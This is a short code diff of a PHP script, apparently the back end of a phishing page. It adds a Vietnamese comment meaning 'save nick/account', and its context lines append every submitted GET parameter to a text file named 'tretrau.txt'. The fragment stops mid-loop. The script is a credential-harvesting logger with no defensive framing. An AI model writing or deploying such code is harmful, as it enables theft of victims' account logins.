@@ -1,4 +1,5 @@
 <?php
+//Lưu nick
 $handle = fopen("tretrau.txt", "a");
 foreach($_GET as $variable => $value) {
    fwrite($handle, $variable);
